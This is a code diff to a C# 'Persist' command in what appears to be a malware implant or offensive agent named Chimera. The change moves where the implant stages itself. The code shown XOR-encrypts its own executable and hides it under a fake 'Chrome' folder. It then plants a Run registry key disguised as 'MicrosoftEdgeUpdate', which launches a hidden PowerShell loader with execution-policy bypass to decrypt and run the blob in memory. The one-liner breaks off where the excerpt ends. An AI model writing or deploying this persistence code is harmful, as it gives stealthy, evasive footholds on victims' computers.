@@ -5,20 +5,22 @@ using Microsoft.Win32;
 namespace Chimera.Commands
 {
     // persist — fileless XOR-encrypted persistence
-    // 1. XOR-encrypts own binary and writes to C:\Users\Public\agent.dat (hidden)
+    // 1. XOR-encrypts own binary and writes to staging dir (C:\Users\Public\Chrome\agent.dat)
     // 2. Sets HKCU Run key with a PowerShell one-liner that decrypts and loads
     //    the blob entirely in memory — no unencrypted .exe ever touches disk.
     public static class Persist
     {
         private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
         private const string RegValue = "MicrosoftEdgeUpdate";
-        private const string BlobPath = @"C:\Users\Public\agent.dat";
+        private static readonly string BlobPath = Path.Combine(Staging.Dir, "agent.dat");
         private static readonly byte XorKey = 0x41;
 
         public static string Execute()
         {
             try
             {
+                Staging.EnsureDir();
+
                 string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                 byte[] raw = File.ReadAllBytes(selfPath);
 
@@ -31,7 +33,6 @@ namespace Chimera.Commands
                     File.GetAttributes(BlobPath) | FileAttributes.Hidden);
 
                 // Correctly-escaped PowerShell one-liner — decrypts blob in memory and runs it
-                // Uses string concatenation so there are no interpolation/escape issues
                 string loader =
                     @"powershell -ep bypass -WindowStyle Hidden -c " +
                     "\"$k=0x41;" +
